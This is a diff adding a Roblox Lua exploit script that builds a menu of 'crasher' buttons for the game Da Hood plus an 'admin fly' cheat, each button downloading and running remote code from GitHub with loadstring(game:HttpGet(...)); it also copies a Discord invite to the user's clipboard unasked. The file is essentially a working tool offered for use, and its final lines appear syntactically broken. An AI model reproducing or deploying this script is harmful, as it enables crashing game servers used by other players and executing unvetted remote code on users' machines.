@@ -1,0 +1,53 @@
+pcall(function()
+  game.StarterGui:SetCore("SendNotification", {
+    Title = 'Gui';
+    Text = 'Made by rodizzy#0001';
+    Duration = 2;
+  })
+  if not game.Players.LocalPlayer:IsInGroup(12312312) then
+    coroutine.resume(coroutine.create(function()
+       wait(2)
+       game.StarterGui:SetCore("SendNotification", {
+        Title = 'ERROR';
+        Text = 'The script Will work but make sure to join the discord group for more scripts and hubs! server has been copied to your clipboard.';
+        Duration = 2;
+       })
+       setclipboard('https://discord.gg/dcRkcK9Ppf')
+    end))
+  end
+end)
+
+game:GetService("StarterGui"):SetCore("SendNotification", {
+Title = "Credits";
+Text = "developed rodizzy#0001";
+})
+
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("ALL Best  CRASHERS (SYNUS CRASHER COMING OUT SOON) ", "DarkTheme")
+
+local main = Window:NewTab("Crasher section")
+local MainSection = main:NewSection("main crashers")
+
+
+MainSection:NewButton("Betterdahood", "Betterdahood crasher", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/BetterDaHood/BetterDaHoodCrasher/main/Crash'))()
+end)
+
+
+MainSection:NewButton("Swag mode", "Swag mode crasher", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+end)
+
+
+MainSection:NewButton("Encrypt crasher", "Encrypt crasher", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua"))()
+end)
+
+local main = Window:NewTab("EXTRA STUFF")
+local MainSection = main:NewSection("main crashers")
+
+
+MainSection:NewButton("Admin fly", "Admin fly makes fly", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/22kristina/swag/main/admin_fly'))()end)
+end)
